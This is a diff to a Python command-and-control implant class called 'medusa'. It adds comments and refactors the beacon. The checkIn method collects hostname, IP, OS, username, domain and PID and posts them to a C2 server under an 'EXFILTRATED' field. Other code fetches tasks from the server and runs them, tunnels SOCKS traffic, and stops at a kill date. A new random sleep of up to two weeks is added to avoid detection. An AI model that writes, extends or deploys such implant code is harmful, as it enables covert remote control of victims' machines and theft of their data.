@@ -1,5 +1,5 @@
 '''
- # @ Author: Taylor Brierley
+ # @ Author: Taylor Brierley, Newt Tan
  # @ Create Time: 2024-09-16 09:48:58
  # @ Modified by: Taylor Brierley, Newt Tan
  # @ Modified time: 2024-09-16 09:49:52
@@ -16,6 +16,9 @@ import urllib.request
 from datetime import datetime
 import threading, queue
 import enc
+import time
+from hmac import new, compare_digest
+
 
 CHUNK_SIZE = 51200
 
@@ -23,6 +26,9 @@ CHUNK_SIZE = 51200
 class medusa:
 
     def __init__(self):
+        ''' define parameter for communication with C2 server
+        
+        '''
         self.socks_open = {}
         self.socks_in = queue.Queue()
         self.socks_out = queue.Queue()
@@ -41,6 +47,7 @@ class medusa:
             "Jitter": 23,
             "KillDate": "2025-09-13",
             "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
+            # "enc_key": {"dec_key": None, "enc_key": None, "value": "aes256_hmac"},
             "ExchChk": "False",
             "GetURI": "/index",
             "GetParam": "q",
@@ -50,12 +57,15 @@ class medusa:
             "ProxyPort": "",
         }
 
-        while(True):
+        # keep scanning the target system with random intervals
+        while True:
+            # comment when in testing
+            # self._random_time_sleep()
             if(self.agent_config["UUID"] == ""):
                 self.checkIn()
                 self.agentSleep()
             else:
-                while(True):
+                while True:
                     if self.passedKilldate():
                         self.exit()
                     try:
@@ -65,7 +75,69 @@ class medusa:
                     except: pass
                     self.agentSleep()                   
 
+    def _random_time_sleep(self):
+        ''' define the random time to avoid certain or frequent scanning
+        
+        '''
+        # define the range of hours
+        min_hours = 0.1
+        max_hours = 336
+
+        # convert hours to seconds
+        time_to_sleep = random.randint(min_hours*3600, max_hours*3600)
+
+        return time.sleep(time_to_sleep)
+
+
+    def checkIn(self):
+        ''' send extracted data to remote host
+        
+        '''
+        hostname = socket.gethostname()
+        ip = ''
+        if hostname and len(hostname) > 0:
+            try:
+                ip = socket.gethostbyname(hostname)
+            except:
+                pass
+
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+
+        file_path = os.path.join(script_dir, "system_info.json")
+        
+        system_info = self.get_system_info()
+        self.save_system_info_to_file(file_path, system_info)
+        print(f"System information saved to {file_path}")
+
+        data = {
+            "EXFILTRATED ": system_info,
+            "action": "checkin", 
+            "ip": system_info['ip_address'],
+            "os": system_info['os_details']['system'],
+            "user": self.getUsername(),
+            "host": system_info['hostname'],
+            "domain:": socket.getfqdn(),
+            "pid": os.getpid(),
+            "uuid": self.agent_config["PayloadUUID"],
+            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
+            "encryption_key": self.agent_config["enc_key"]["enc_key"],
+            "decryption_key": self.agent_config["enc_key"]["dec_key"]
+        }
+        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + \
+                                         self.encrypt(json.dumps(data).encode()))
+        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
+        if "status" in decoded_data:
+            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
+            self.agent_config["UUID"] = UUID
+            return True
+        else: 
+            return False
+
+
     def get_system_info(self):
+        ''' collect or scan system information
+        
+        '''
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
         os_details = platform.uname()
@@ -108,7 +180,10 @@ class medusa:
 
 
     def encrypt(self, data):
-        from hmac import new
+        ''' encrypt extracted data from pre-define method
+        
+        '''
+        
         if self.agent_config["enc_key"]["value"] == "aes256_hmac" and len(data)>0:
             key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
             iv = os.urandom(16)
@@ -116,11 +191,13 @@ class medusa:
             hmac = new(key, iv + ciphertext, 'sha256').digest()
             return iv + ciphertext + hmac
         else:
+            print('data to encrypt', data)
             return data
 
     def decrypt(self, data):
-        from hmac import new, compare_digest
-
+        ''' decrypt cipher based on options
+        
+        '''
         if self.agent_config["enc_key"]["value"] == "aes256_hmac":
             if len(data)>0:
                 key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
@@ -136,7 +213,7 @@ class medusa:
             else: 
                 return ""
         else: 
-            print(data)
+            print('data to decrypt', data)
             return data.decode()
 
 
@@ -171,6 +248,9 @@ class medusa:
         response_data = self.postMessageAndRetrieveResponse(message)
 
     def postResponses(self):
+        ''' specify the structure when posting response
+        
+        '''
         try:
             responses = []
             socks = []
@@ -195,6 +275,9 @@ class medusa:
         except: pass
 
     def processTask(self, task):
+        ''' call function/task to execute
+        
+        '''
         try:
             task["started"] = True
             function = getattr(self, task["command"], None)
@@ -219,6 +302,9 @@ class medusa:
             task["result"] = error
 
     def processTaskings(self):
+        ''' run tasks in a loop
+        
+        '''
         threads = list()       
         taskings = self.taskings     
         for task in taskings:
@@ -228,6 +314,9 @@ class medusa:
                 x.start()
 
     def getTaskings(self):
+        ''' receive commands from C2 server
+        
+        '''
         data = { "action": "get_tasking", "tasking_size": -1 }
         tasking_data = self.getMessageAndRetrieveResponse(data)
         for task in tasking_data["tasks"]:
@@ -245,51 +334,17 @@ class medusa:
         if "socks" in tasking_data:
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
-    def checkIn(self):
-        hostname = socket.gethostname()
-        ip = ''
-        if hostname and len(hostname) > 0:
-            try:
-                ip = socket.gethostbyname(hostname)
-            except:
-                pass
-
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-
-        file_path = os.path.join(script_dir, "system_info.json")
-        
-        system_info = self.get_system_info()
-        self.save_system_info_to_file(file_path, system_info)
-        print(f"System information saved to {file_path}")
-
-        data = {
-            "EXFILTRATED ": system_info,
-            "action": "checkin", 
-            "ip": system_info['ip_address'],
-            "os": system_info['os_details']['system'],
-            "user": self.getUsername(),
-            "host": system_info['hostname'],
-            "domain:": socket.getfqdn(),
-            "pid": os.getpid(),
-            "uuid": self.agent_config["PayloadUUID"],
-            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
-            "encryption_key": self.agent_config["enc_key"]["enc_key"],
-            "decryption_key": self.agent_config["enc_key"]["dec_key"]
-        }
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
-        if("status" in decoded_data):
-            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
-            self.agent_config["UUID"] = UUID
-            return True
-        else: return False
-
+    
     def makeRequest(self, data, method='GET'):
+        ''' send requset for C2 communication
+        
+        '''
         hdrs = {}
         for header in self.agent_config["Headers"]:
             hdrs[header] = self.agent_config["Headers"][header]
         if method == 'GET':
-            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
+            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + \
+                                         self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
         else:
             req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
         
@@ -317,6 +372,9 @@ class medusa:
         except: return ""
 
     def passedKilldate(self):
+        ''' define specific date to kill whole communication
+        
+        '''
         kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
         kd = datetime(kd_list[0], kd_list[1], kd_list[2])
         if datetime.now() >= kd: return True
